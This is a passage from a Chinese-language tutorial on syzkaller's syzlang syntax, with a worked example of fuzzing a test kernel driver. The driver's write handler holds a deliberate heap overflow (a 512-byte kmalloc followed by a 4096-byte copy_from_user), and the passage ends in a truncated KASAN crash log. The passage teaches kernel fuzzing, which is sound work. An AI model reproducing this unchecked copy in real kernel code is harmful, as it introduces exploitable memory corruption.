flags[open_flags]\n\n上面这个例子的解析，我们这个参数名为flags参数，输入的类型为flags，其类型选项为对一个flags描述open_flags的应用，即为取open_flags中的值。\nopen_flags = O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE\n\n其中的open_flags定义的内容如上，这些值可以通过include语句从内核源码中被包含进来。\n系统调用在前面提到了系统调用的模板如下\nsyscallname &quot;(&quot; [arg [&quot;,&quot; arg]*] &quot;)&quot; [type] [&quot;(&quot; attribute* &quot;)&quot;]\n\n其中除了attribute都已经做过一定解释了，这里在对其做分解分析。\nopen(file ptr[in, filename], flags flags[open_flags], mode flags[open_mode])open_flags = O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILEopen_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH\n\n这里对open系统调用，存在以下三个输入：\n\n  file 参数：一个指针类型，其 type-opetions 的第一个为 in，意为由该指针指向特定对象，第二个为 filename，为特殊的 string 对象，对于 filename，syzlang 会进行文件生成，将文件名作为输入\n  flags 参数：一个 flags类型，其 type-options 为 open_flags ，意为从我们定义的 flags——open_flags 中取值\n  mode 参数：一个flags类型，其 type-options 为 open_mode ，意为从我们定义的 flags——open_mode 中取值\n\n一般来说，系统调用都会存在返回值，在syzlang中可以忽略掉返回值也可以选择接收，如果选择接收则应形如上式在系统调用后面加上一个type，例如open系统调用会返回一个文件描述符，若是我们像将其返回的的文件描述符存到一个变量中如test_fd，我们应当写成如下形式：\nopen(file ptr[in, filename], flags flags[open_flags], mode flags[open_mode]) test_fdopen_flags = O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILEopen_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH\n\n既然文件描述符中已经存在我们的变量，那么在后续也是可以继续使用的，如下:\nclose(fd test_fd)\n\n随后就是前面提到的，在type后还有一个可选参数attribute，其有以下可选值：\n\n  disabled：该系统调用将不用于 fuzzing；这个属性通常用于临时禁用某些系统调用，或者禁用特定的参数组合\n  timeout[N]：系统调用在默认值以外的额外的超时时间，单位为毫秒（ms）\n  prog_timeoout[N]：若一个程序包含了该系统调用，则该属性为整个程序的执行的超时时间，若存在多个定义了该属性的系统调用则取最大值\n  ignore_return：在回退反馈中忽视这个系统调用的返回值；用于不返回固定的错误码（例如 -EFAULT）而是返回其他值的系统调用\n  break_returns：忽略回退反馈中程序中所有后续系统调用的返回值\n\n接着就是系统调用的变种（variants）可以在系统调用名后面使用 $ 符号进行额外的指定\nsocket$inet_tcp(domain const[AF_INET], type const[SOCK_STREAM], proto const[0]) sock_tcpsocket$inet_udp(domain const[AF_INET], type const[SOCK_DGRAM], proto const[0]) sock_udp\n\n例如socket系统调用可以用于创建很多类型的socket，上述定义了两种不同的变体。而变种的作用主要是区分syscall，类似于别名的效果。\n整型整型也是一种 type，其可选项为 int8 、int16、int32、int64，表示相应大小的整型，intptr 用以表示一个指针大小的整型，对应 C 语言中的 long，通过添加 be 后缀表示这个整型存储为大端序。\n可以用 int32[0:100] 或 int32[0:4096,512] 的格式为一个 512 对齐的 int 指定一个整数的值范围。\nread$eventfd(fd fd_event, val ptr[out, int64], len len[val])\n\n结构体在syzlang中同样可以存在结构体，联合体这一说，既然前面已经提到了这么多，这里就放一个它的一个语法结构\nstructname &quot;&#123;&quot; &quot;\\n&quot;\t(fieldname type (&quot;(&quot; fieldattribute* &quot;)&quot;)? &quot;\\n&quot;)+&quot;&#125;&quot; (&quot;[&quot; attribute* &quot;]&quot;)?\n\n可以看出来结构其实和c的很类似，定义一个structname，然后内部成员包含了fieldname / type以及后面可以添加(fieldattribute)，这里的属性与前面的是有一定差距的，这里的属性只有方向in / out / inout\n最后可以看到在结构体结尾可以被[attribute]来添加属性，这里存在以下属性：\n\n  packed：该结构体不同字段之间没有 padding（例如 C 中有一个结构体 struct T&#123;int a; char b;&#125;;，char 为 1 字节，int 为 4 字节，那么该结构体便会对 4 字节对齐，在其两个字段之间就会有 3 字节的 padding）\n  align[N]：指定该结构体对 N 字节对齐，padding 的内容并未指定（通常为0）\n  size[N]：结构体被填充到指定的大小 N\n\ntest_struct &#123;\tfield0\tconst[1, int32]\t  (in)\tfield1\tint32         \t\t(inout)\tfield2\tfd\t\t\t\t\t\t\t\t(out)&#125; [packed]\n\n与结构体类似，联合体的语法结构如下：\nunionname &quot;[&quot; &quot;\\n&quot;\t(fieldname type (&quot;(&quot; fieldattribute* &quot;)&quot;)? &quot;\\n&quot;)+&quot;]&quot; (&quot;[&quot; attribute* &quot;]&quot;)?\n\n与前面的区别主要是最后的[attribute]中的可选性的区别，这里主要有：\n\n  varlen：联合体的大小可变（为指定的字段的长度），若未指定则该联合体大小为其最大字段的大小（类型 C 语言）\n  size[N]：该联合体被填充到指定的大小 N\n\n资源资源的定义是作为一个系统调用的输出作为另一个系统调用输入的值。在前面的时候其实已经是提到过了，使用open系统调用打开的文件描述符再交由close系统调用进行关闭，如果要实现这样的效果则需要声明一个资源。资源的形式如下：\n&quot;resource&quot; identifier &quot;[&quot; underlying_type &quot;]&quot; [ &quot;:&quot; const (&quot;,&quot; const)* ]\n\n其中的identifier即位其标识也就是名字，后面的underlying_type 可以是 int8, int16, int32, int64, intptr 或者是另一个资源。常量集合可以作为可选参数，表示该资源的特殊值（比如说 0xdeadbeef），特殊值偶尔被用作资源的值，若未指定特殊值，则会使用特殊值 0。\nresource fd[int32]: 0xffffffffffffffff, AT_FDCWD, 1000000resource sock[fd]resource sock_unix[sock]socket(...) sockaccept(fd sock, ...) socklisten(fd sock, backlog int32)\n\n资源不一定是系统调用的返回，他可以像其他任何数据一样被使用。\nresource my_resource[int32]request_producer(..., arg ptr[out, my_resource])request_consumer(..., arg ptr[inout, test_struct])test_struct &#123;\t...\tattr\tmy_resource&#125;\n\n对于更为复杂的生产者/消费者场景，字段属性也可以被利用，例如：\nresource my_resource_1[int32]resource my_resource_2[int32]request_produce1_consume2(..., arg ptr[inout, test_struct])test_struct &#123;\t...\tfield0\tmy_resource_1\t(out)\tfield1\tmy_resource_2\t(in)&#125;\n\n类型别名这个的形式很类似于C语言中的typedef：\ntype identifier underlying_type\n\ntype bool8\t\tint8[0:1]type bool16\t\tint16[0:1]type bool32\t\tint32[0:1]type bool64\t\tint64[0:1]type boolptr\tintptr[0:1]type fileoff[BASE] BASEtype filename string[filename]type buffer[DIR] ptr[DIR, array[int8]]\n\n在布尔中的取值返回就是0和1所以可以使用intN[0:1]来达到效果，不过在后面每次使用会使的易读性大打折扣，所以可以定义为bool。\n类型模板其形式如下：\ntype optional[T] [\tval\t\tT\tvoid\tvoid] [varlen]\n\n其在的简单的用法为\ntype buffer[DIR] ptr[DIR, array[int8]]type fileoff[BASE] BASEtype nlattr[TYPE, PAYLOAD] &#123;\tnla_len\t\tlen[parent, int16]\tnla_type\tconst[TYPE, int16]\tpayload\t\tPAYLOAD&#125; [align_4]syscall(a buffer[in], b fileoff[int64], c ptr[in, nlattr[FOO, int32]])\n\n长度你可以使用关键字 len、bytesize、bitsize 来指定结构体当中特定字段的长度，若是 len 的参数为一个指针，则其取值为指针所指对象的大小，若要表示一个 N 字节的字中字段的长度，则应当使用 bytesizeN，其中 N 的取值可以为 1、2、4、8。\nwrite(fd fd, buf ptr[in, array[int8]], count len[buf])sock_fprog &#123;\tlen\tlen[filter, int16]\tfilter\tptr[in, array[sock_filter]]&#125;\n\n在上面的write系统调用中，第三个参数的类型为len[buf]，这里的含义表示buf的长度。在 sock_fprog 这个结构体当中，我们给其字段 len 设置的值为其 filter 字段的长度，类型为 int 16。\ns1 &#123;    f0      len[s2]  # length of s2&#125;s2 &#123;    f0      s1    f1      array[int32]    f2      len[parent, int32]&#125;\n\n若要表示父类的长度，可以使用 len[parent, intN]，若要在结构体互相嵌入时表示更顶层的父类的长度，可以指定特定父类的类型名称。\ns1 &#123;\ta\tptr[in, s2]\tb\tptr[in, s3]\tc\tarray[int8]&#125;s2 &#123;\td\tarray[int8]&#125;s3 &#123;# This refers to the array c in the parent s1.\te\tlen[s1:c, int32]# This refers to the array d in the sibling s2.\tf\tlen[s1:a:d, int32]# This refers to the array k in the child s4.\tg\tlen[i:j, int32]# This refers to syscall argument l.\th\tlen[syscall:l, int32]\ti\tptr[in, s4]&#125;s4 &#123;\tj\tarray[int8]&#125;foo(k ptr[in, s1], l ptr[in, array[int8]])\n\n这里可以看出len也适用于更为复杂的路径寻址。\n进程proc 类型用于表示每个进程的数值。这样做的目的是为每个执行者提供一个单独的数值范围，这样他们就不会相互干扰。\n最简单的例子是一个端口号。proc [20000, 4, int16be] 类型意味着我们要从 20000 开始生成一个 int16be 整数，并为每个进程分配 4 个值。因此，执行者编号 n 将得到 [20000 + n * 4, 20000 + (n + 1) * 4] 范围内的值。\n整型常量整型常量可以指定为十进制、0x 开头的十六进制、用单引号 &#39; 包裹的字符，或者从内核头文件中提取出来的由 define 定义的常量（比如说 O_RDONLY）。\nfoo(a const[10], b const[-10])foo(a const[0xabcd])foo(a int8[&#x27;a&#x27;:&#x27;z&#x27;])foo(a const[PATH_MAX])foo(a ptr[in, array[int8, MY_PATH_MAX]])define MY_PATH_MAX\tPATH_MAX + 2\n\n其他描述文件还包括用以进行内核头文件包含的 include 指令，用以包含内核头文件目录的 incdir 指令，以及用以设置常量的 define 指令。\nsyzkaller executor 还定义了一些伪系统调用，我们可以在描述文件中使用这些伪系统调用。这些伪系统调用被扩展为 C 代码，可以执行用户自定义的一些操作。\n尝试捕捉简单溢出洞syz-extract第一步是从内核源文件中提取符号常量的值：syz-extract 会根据 syzlang 文件从内核源文件中提取出使用的对应的宏、系统调用号等的值，生成 .const 文件\nsyz-sysgen第二步便是将描述翻译成 Golang 代码：syz-sysgen 通过 syzlang 文件与 .const 文件进行语法分析与语义分析，生成抽象语法树，最终生成供 syzkaller 使用的 golang 代码，分为如下四个步骤：\n\n  assignSyscallNumbers：分配系统调用号，检测不支持的系统调用并丢弃\n  patchConsts：将 AST 中的常量替换为对应的值\n  check：进行语义分析\n  genSyscalls：从 AST 生成 prog 对象\n\n实战流程首先编写一个具有漏洞的驱动\n#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/init.h&gt;#include &lt;linux/fs.h&gt;#include &lt;linux/device.h&gt;#include &lt;linux/slab.h&gt;#define DEVICE_NAME &quot;intel_rapl_msrdv&quot;#define CLASS_NAME &quot;intel_rapl_msrmd&quot;#define DEVICE_PATH &quot;/dev/intel_rapl_msrdv&quot;static int major_num;static struct class *module_class = NULL;static struct device *module_device = NULL;static struct file *__file = NULL;struct inode *__inode = NULL;static int __init test_init(void);static void __exit test_exit(void);static int test_open(struct inode *, struct file *);static ssize_t test_read(struct file *, char __user *, size_t, loff_t *);static ssize_t test_write(struct file *, const char __user *, size_t, loff_t *);static int test_release(struct inode *, struct file *);static long test_ioctl(struct file *, unsigned int, unsigned long);static struct file_operations test_op =    &#123;        .owner = THIS_MODULE,        .unlocked_ioctl = test_ioctl,        .open = test_open,        .read = test_read,        .write = test_write,        .release = test_release,&#125;;static int test_open(struct inode *__inode, struct file *__file)&#123;    return 0;&#125;static ssize_t test_read(struct file *__file, char __user *user_buf, size_t size, loff_t *__loff)&#123;    return 0;&#125;static ssize_t test_write(struct file *__file, const char __user *user_buf, size_t size, loff_t *__loff)&#123;    char *param;    param = kmalloc(512, GFP_KERNEL);    copy_from_user(param, user_buf, 4096);    return size;&#125;static int test_release(struct inode *__inode, struct file *__file)&#123;    return 0;&#125;static long test_ioctl(struct file *__file, unsigned int cmd, unsigned long param)&#123;    return 0;&#125;static int __init test_init(void)&#123;    major_num = register_chrdev(0, DEVICE_NAME, &amp;test_op);    if (major_num &lt; 0)        return major_num;    module_class = class_create(THIS_MODULE, CLASS_NAME);    if (IS_ERR(module_class))    &#123;        unregister_chrdev(major_num, DEVICE_NAME);        return PTR_ERR(module_class);    &#125;    module_device = device_create(module_class, NULL, MKDEV(major_num, 0), NULL, DEVICE_NAME);    if (IS_ERR(module_device))    &#123;        class_destroy(module_class);        unregister_chrdev(major_num, DEVICE_NAME);        return PTR_ERR(module_device);    &#125;    __file = filp_open(DEVICE_PATH, O_RDONLY, 0);    if (IS_ERR(__file))    &#123;        device_destroy(module_class, MKDEV(major_num, 0));        class_destroy(module_class);        unregister_chrdev(major_num, DEVICE_NAME);        return PTR_ERR(__file);    &#125;    __inode = file_inode(__file);    __inode-&gt;i_mode |= 0666;    filp_close(__file, NULL);    return 0;&#125;static void __exit test_exit(void)&#123;    device_destroy(module_class, MKDEV(major_num, 0));    class_destroy(module_class);    unregister_chrdev(major_num, DEVICE_NAME);&#125;module_init(test_init);module_exit(test_exit);MODULE_LICENSE(&quot;GPL&quot;);MODULE_AUTHOR(&quot;196082&quot;);MODULE_INFO(intree, &quot;Y&quot;);\n\n可以看到这里存在明显的堆溢出。\nobj-m += vuln_device.oCURRENT_PATH := $(shell pwd)LINUX_KERNEL := $(shell uname -r)LINUX_KERNEL_PATH := ~/linux-5.11all:\tmake -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) modulesclean:\tmake -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) clean\n\n通过上述的Makefile编译\ninclude &lt;linux/fs.h&gt;resource fd_111[fd]open$test(file ptr[in, string[&quot;/dev/intel_rapl_msrdv&quot;]], flags flags[vuln_open_flags], mode flags[vuln_open_mode]) fd_111read$test(fd fd_111, buf buffer[out], count len[buf])write$test(fd fd_111, buf buffer[in], count len[buf])vuln_open_flags = O_RDONLY, O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILEvuln_open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH\n\n编写syzlang随后放入到sys/linux/目录下。\nmake bin/syz-extractmake bin/syz-sysgen\n\n编译 syz-extract 和 syz-sysgen\n./bin/syz-extract -os linux -sourcedir &quot;~/linux-5.11&quot; -arch amd64 vuln_test.txt\n\n通过syz_extract生成对应的const文件，随后重新运行\n./bin/syz-sysgenmake generatemake\n\n随后配置config文件\n&#123;    &quot;target&quot;: &quot;linux/amd64&quot;,    &quot;http&quot;: &quot;127.0.0.1:56741&quot;,    &quot;rpc&quot;: &quot;127.0.0.1:0&quot;,    &quot;sshkey&quot;: &quot;/media/psf/pwn/fuzz01/bullseye.id_rsa&quot;,    &quot;workdir&quot;: &quot;/media/psf/pwn/fuzz01&quot;,    &quot;kernel_obj&quot;: &quot;/home/parallels/linux-5.11&quot;,    &quot;syzkaller&quot;: &quot;/home/parallels/fuzz/gopath/syzkaller&quot;,    &quot;sandbox&quot;: &quot;setuid&quot;,    &quot;type&quot;: &quot;isolated&quot;,    &quot;enable_syscalls&quot;: [        &quot;open$test&quot;,        &quot;read$test&quot;,        &quot;write$test&quot;    ],    &quot;vm&quot;: &#123;        &quot;targets&quot;: [            &quot;127.0.0.1:10021&quot;        ],        &quot;pstore&quot;: false,        &quot;target_dir&quot;: &quot;/home/fuzzdir&quot;,        &quot;target_reboot&quot;: true    &#125;&#125;\n\n这里写法与上面略有不同，不过看一下是挺好理解的。其中的enable_syscalls主要是限制只允许调用什么系统调用。\nsudo ./bin/syz-manager -config=/media/psf/pwn/fuzz01/config.json\n\n最后通过上述命令启动fuzz。\n\n\n\nDescriptions\nCount\nLast Time\nReport\n\n\n\nKASAN: slab-out-of-bounds Write in test_write\n1\n2023/11/10 16:31\nreproducing\n\n\n当跑出一个crash会出现如上表格，其一个含义可以看到是在test_write中触发了一个slab-out-of-bounds，也就是越界。然后最后的report显示的状态是正在尝试重现这个crash运气不佳的是这个并不能重现，如果能够重现则会显示其对应的结果，如果一个品相好的漏洞其report会显示has C repo表示有该crash的C语言代码。\nr2 = open$test(&amp;(0x7f0000000380), 0x10000, 0x2)write$test(r2, &amp;(0x7f00000003c0)=&quot;da0f433ee1bffca3085037fc1dcce3ed4bce4ba262cfd2069703973bbd42cb061bc099e240f5a5645d2d34a9cb270151cd6edcdd7e26dbb7ff57eae5352b1920eb5e2354178f009c8c3b86de024a06cd9c24386cf0db616ae8ef502687bc61db26bb28ff8f81500321e73feb9a639fbdf287fa98c6a0e6de0510c675e920cf4e5dc6e2cb9fe4e4be66ddb29bf45283b0f9359a0028e4ffc65c54ec966e16113a6b49e3ba85f9f29aa297e978a5944426f644de7a37cfd242563e97b2ec55f3633fe9569b776c3a299ec199153afd8187b798f515ae9fdf30ebda4d9bfad062514718bef675a6528e2879aeb56ad583077ffe63f4a0e994ef211deb84f15379f6b1fa2067cf9e4d4bd7bfc5ed7ec8133ae06be457e498087f306d661684531a7f353dfeb8982d89a1a6a3554b5bbe27379c20c9bae3a5672ea0176721d8e38fbb656064062ff431efac310c5a3dc36d754b2407a82d63e152ecefa945219d0149fd17ae8c37b563ae571108ea67e7642da91f629d797380411d153b68e2ce1050f75c8be7ee1f4c626127223ee46d61986db8685710a79b8cf636570c5a522a2d83971fb5fa457326030a2899e3acfb54a4764cb8e46892c49e4ca23b633384886260f23e6ca06522928c82364950d8e24feab8c02b2442a1a102eb4374c721b6c59f66ad306ce03215d5f4db91151b0690669a09b5b59f249b64172a0009be02dd91a8c8733f9b9a64c72b3342c1c7e770e52fe6c31fff0d856ac0de9344555449e2c817f27363ef1694d10c2dd92b15f0698b003f586444a1b529c2ec2d338b64ba2bfa2ecd285b4631f8df46969a646a291c7e967c323589e49e5e01b29547848f62e9672a07e9a223ebc612058a4d1849ba105b09bbfbb2ee4dc62d32ee80ed4302a2921ed7de6f51bf068fe420debed43a0a0ecad74bba4b0d576afe8e4df6900d7fe7104427c87c1559576020c751bc040f905caf5c155331af5645872210cc76dc3a356bb3abdd373c9e02f1770f5df9b9de527e6a3359016c56199e35a832b658a410e2a97f549edf96f8781aeb5fa08e922f333d86026c62f1a24f865074202002a85042bb85ddbcbf4430b446bb0cdf984682f1d8fc7a1889352407d1c781a653fe489ece1e7ffbdc15cb0cec3ff776b7d1a34fc9642fcbdc8f2a732dae5f00a692e78dbd4f6a94986f35b38ac8aecbe3c2bc4a7932b5e933c08c4c5f8b90eb1ce3c80af44fd11d2715ec76b369e6468170a93757083a701a2d84c08a1602533ee4ab629f0839a984546a8aa1b7fee547fa4d78f6d67397ea1e9f853e22da69fe40ba837cc6a64a1ad873d971fe383ae2c862301672c236f758aa1ede00483cc4f40b066e1e3e9997ba723141726af050ba7789c9e7451a0baf52e9d49b44e8d92ab5df925598e6d9b8b10bee1089c6ff3f9dd9dfd660f832c025fcb20a159bd305563647ae9c4f0fedf7f3fd9d2d0589956cee8f5ec040f043cd931539fa7880fd69147e5a32c468611774f18987adca95a0eaa0b962f4c2fdcb91ac52ec28e39704b924bd3fc0e1f796bbd9c8b815b646b682f1d4796b9e567112453291220a7f5d2012a565f7abfba7fd318e72530b1cf04d74b42e64627c6936587c81d9bae45fc0cc2815674946427529151641aba2284c17c8ca26d7b8e0cf45ccb12db3705693a9eeb5b92d84830aae5aa170e6317544681b24a8fcb01ff769d3e89f65e9b205540239d43b81a6c2679810a3467ff0bef5bce56bcb853b60744315fc0f2899e6db88edd5ff2c8d11bd0ea553b3b1766f2ba0ac02e46805a89cfb8f71d743666556f530b759528877b8b71aa6f882616c8a795ef295961007c07479673af54818ccc79b5e43e2bbdcf00ff3d9cbfe679c6e7fc688dd0797c0a7a7e22cbdad3f1f3e3e99f8ed3b17b7f04de17e5817d48abb90203163317ee630fae9bbbe06887208ce9138b0ce0bb8ce511229698c71351c8cbdef2dcf0279c4b334c55254babf6bf4b00a7a2e89557550f338ab5e332824fbf4f1f774b970248916bdd4922fe69c825d62950c6b6a98f49795ef6fbacfc65fd8e879bad0e2963f46be54ae3c699339384cbde926d360501a6a0f0f21090d8f735301c04230d969ec4e88f1e18fc62e656ac03610dc1772295df75ca08fbd4e1fd7f39eb2cb349878a4936d35f335d1eac7da574276a6d43672393a747dd7182c27100370667700f3de9b0389cf8ac812f5ad07c7517a2a64ca22b17f120011e2a70d95cb8f7835f7cc0481defaf20665a0418e1385d0306ee26c5a861ef69e37ccb91237c9c106e9b483ae4e1c3957e02f1f5b247c835dff73502bf518d1c80e827c7d6221f1c8ca9226d2a1ef904f5025504544f4024c60ff5bf23f5b79cee9720745bf36a86179d7d0af1758e663bcd6e98d2f9339dc9ecc038a1521bb16edfbb9071fb09c2917a2144c90cd752b5683e321b70271089252da45fbb01ec19e9bc9261f7f50e129d44f6ecfed3222f7bc9943356b46f0aa97f1b03ef95890543c22a00655a8c99fdccd4ef04a7d72084d5c77a96025d5095ed608b19d0f5a7ae778fa4eab4a8f739b5ceb3fc97f11ec67a9b6c6d7ff88a4395e8bc27e8b7034de7be8683c958f2773f2bb985a9bede7e1d39aa7899e1e88aa7d7af00a9a9f084a094636af8160a14626d2c0dc142656911e418aef80dcace137e41ad996984975c62f63e5f0fdc53a699944c2e06d275264375a5330e4a295918e6f0f6e57d82e2de705eb9ce5791eac9a117d9912c6d6ae1ffdb08389dfd1eea539d2e9069520076873608d22975dd38bfd1df04c4f9dcac4bfed02af53802f8582ac59321a8453e69a7cb5a5cee4a6940466a5cecb19c9527c94d0441ad4328297f3e92714ee3153b459f45cad7e2a2197da7bb5f3ea498e0b9e49405e8f4c881eb6a9555b82072d5a3fa06b935d0c127244d747a637d09fceaffc64f983aa7df54d59f265ed28ebe79f41ebd72c2a401b88adf0daf4158bc47faebfec1fcf934b55a9bac5da808566db2216c21c17b26e25dc8566e3a14bbddd83b8d2db809a5098f5404e67958fa801f073ba48e5c0b4a5a1a98df77d8d81dd1054c7e8ece8ac44d4c21435e830c7d28927b1a61670886116d4f819bd406dd61c0bc7e57933b9071cd1de7fe9e5e8bfb66c3e637f3dc27329c936b47c2ce5f7bd8d96e889c9a4cfe6ffcfcc1b2de5b1b6cc417952d07413fbaa586bc997db9dc916a529d6e6ef7d358f41d35f888825f6491bea834adb7d57a6fdfe7b61e6ed369329b009404352f168b1adf1683fa8c860e272dcdc5593e100d83fa4bf2fcb4832bd6da307c3910675e36f5df01e1e90253948f17a6b286f50afff315e562d8feb83c8dd68397319022dfd951be06d494e9bba6dc0ddc8c8b20821522ae68bb02b749925c94f7d80566cdfdef0f6076cf7542ec7c064d0a9e1a7f71d5b67a88a94ad19d4a73e3f16d68709e0e5ca166d37c8baa384434732bba3e7d08fba66f012d22e21077a23001f1f0160f4efee36be51edb83910cd2e7362fdc173d5699b634e75489a16580c733ffce3df11d5f482c7ff82cd8c843c0d513404758016955862d308c1e0e36ad3d98652cf837782423451c4e8638990fb65eff25c380caed61a0a8fbd1cc484ecc70467efc17310cef1fd3c075d339f40067b71b15541571be112f85f89afc6fc842b263e3ce57116176402a76e695fd28eacc2da85ee62aafa6bcb896d554f843ee152e6b84b8a3c6aaeea7443b5290cec768ba0ba2aada7dee7438b76861d2434104fac6a86f7448981ab970d27c5268d3d7eac9ff26b657affacbd0dbdc30ecfd0e305fba89461c1d85aef2feb30f0cb9c94a46578d55957984deed9ec02f796246c366adc7cb32eeae18f2d56a86702c04c1dd172a70899d28808d2050d7cdaf78c6975c5dd56ab3435fc40b8019a6bbd8964bc212abb6ab3e82e12604650433964cb48093e46fe79439022f6b862ed96c6bfa59f834a28ae857df0805b6e7b4ed5db1bee79ed3999485131468ebaa043304ce67f01a6b67ac7e0d744326e0c21a857620b0e999534e36c72855a1f674ec301dc06fc1640ee4af225a3f8a1a6ed344bff7b377e957eb6a606c4fb4d82ba4238d3eedeb4ec74ee2dc7341edab9dedfcb49828b901abac4991f5886f663d8d07e77b2b8b4b12c896f28149ca896eb2d9dcb2f18a5ad6c7918e57d0e730d012f39328a94172a9f41946348ed5eed60b87512aec77114c4582ab7a29f0a19e84e52c11b07f14d53b3310cadac1546e0b042243e6afb376192ecd87be7b574f852f411ff5a8a6f7fdb743b568e89a34ba3547b2959f3760e382b75441bea3713c81e31391b10751f80bdb42216d7644d8ab5aedb5ed437e0e7954a1ef4bd6c3cc2aa45b652c86281345eaa3dbaceb684224222db02c9a638475364135284a21097286ef864706c9df5c350dc5933a5ba1d46795f49316705d7ae7cb59f5e91994a6c57ae525189243cd36b8ab1c351eaaa04ace3bccfb1287c4c60667524562b8f350da09e6ca212194d49e6550b2289170c64e8c9d019b4d4f7d888e62b5458c5b28b2eda131079f5e66d35014d5460e7e785bcc7ffc6141384498c55dad57901729fc056a5595850ceb1d5c6d31a6894b8d8b85f9173f9ebc158d2d43952c48d4f3590a4e4fae41ea0aa9c8ab78557fd4e9ca5611b62ca6f0b5f6c46592537f008cd5083b08bc3fd1218773cb10fa44933fbaeed4afa57afae135c8a1898b06a5c2855e3f8a6bfe8ba9a589bceb5f9a5376f220cfdfc977e7416abd7258b40e9df634d966d7d8e665ab3ab6495bd07dcdf32ac3f62eaaf2e18ba093f46c96b7ac2e6fca971dfec82c72fd7241aac6774655ad19b8bebd1766e1afa44510682369083ae89734a7809539193d48146fe83f2401b3a33a0857f8cd2a305bc59e58bf41360fe0abe63a6f99bd12a8d1988a3c52dc3ac7091c71ffbab698284079799bbd66370b473b542dab968670fb8b4444af52b5070601df1702738cb29aceae70c6b916d11bdfc6814d5f57a6b257f62587f4e35525074fc031db80f98b9b59130d831bd8bbaa45ed2544dcb34badeac02b794c19875e3edb4b4b78156995df60b4f03a03a9eae88bc5bc071d0f948f38f9a92511b5939acc135820d10c708edb737c9ad7c7dd80cb9cba5347a712e946409bd400c7bb5badc9ecf969ca886260e184ebcb5826b6de23bd0e0a3935321299d45d0e151c782cde6239490566f11b91bac99fd0d202f20abd4c8fad629c4596b857730ac92cc6e67e3177692dd27f1eaa48ca6d19649d0692bd6ab77772c04535c91660f961222ae3a2fbb2663f4fb737f153595ce9a8b865c2dd36eb19b459e933322ddef02a2412e8dbd3b48e951eb9497f3837a6a3b567c43edb3c4f74bf5356187c591f4419dbc21cec3eb31ed865a6146cb455b6a381f0663f8a09c16eda030839fce28a85faa27a0adbb504cc20e3a1af0c6b29f8a7a8b9cbf2e16cfc4ae9413338a6fe08e30f9c495869828203e774cff77da575ec0399368c5568a5d98e51047ece46b2612fe5ab2613761b58d6dcbd079c7d253db81a540f2b921bd0599b70c3119803fc5e97954feaf4a7f813d77a03a811d2582f14989fca781dc28aa96958b9546cc83fa543bc00928a602f3f4be13ec7f1acb78d57e6ebd599e2a077656ffaf04d9a971a017f2391301fdcd7053925d41f9d355dc229ac94fcc0f0b01070b3cb485cbae3356a5421ff428067e9be643933615b0d3bcbe3a2a6d25&quot;, 0x1000)\n\n上面是截取的log文件，其中会记录系统调用，调用的参数等一系列信息。\n==================================================================BUG: KASAN: slab-out-of-bounds in instrument_copy_from_user include/linux/instrumented.h:135 [inline]BUG: KASAN: slab-out-of-bounds in _copy_from_user+0x66/0xd0 lib/usercopy.c:15Write of size 4096 at addr ffff88810686f800 by task syz-executor/3452CPU: 0 PID: 3452 Comm: syz-executor Not tainted 5.11.0 #1Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014Call Trace: __dump_stack lib/dump_stack.c:79 [inline] dump_stack+0x9c/0xcf lib/dump_stack.c:120 print_address_description.constprop.0+0x1a/0x140 mm/kasan/report.c:230 __kasan_report mm/kasan/report.c:396 [inline] kasan_report.cold+0x7f/0x10e mm/kasan/report.c:413 check_memory_region_inline mm/kasan/generic.c:179 [inline] check_memory_region+0x17c/0x1e0 mm/kasan/generic.c:185 instrument_copy_from_user include/linux/instrumented.h:135 [inline] _copy_from_user+0x66/0xd0 lib/usercopy.c:15 test_write+0x4f/0x70 [vuln_device] vfs_write+0x1bf/0x760 fs/read_write.c:603 ksys_write+0x100/0x210 fs/read_write.c:658 do_syscall_64+0x33/0x40 arch/x86/entry/common.c:46 entry_SYSCALL_64_after_hwframe+0x44/0xa9RIP: 0033:0x7f1a044ec96dCode: c3 e8 17 32 00 00 0f 1f 80 00 00 00 00 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 &lt;48&gt; 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48RSP: 002b:00007f1a0325bbf8 EFLAGS: 00000246 ORIG_RAX: 0000000000000001RAX: ffffffffffffffda RBX: 00007f1a04628f80 RCX: 00007f1a044ec96dRDX: 000000000000003f RSI: 0000000020001580 RDI: 0000000000000004RBP: 00007f1a0454a4af R08: 0000000000000000 R09: 0000000000000000R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000R13: 00007fff371812bf R14: 00007fff37181460 R15: 00007f1a0325bd80Allocated by task 3452: kasan_save_stack+0x1b/0x40 mm/kasan/common.c:38 kasan_set_track 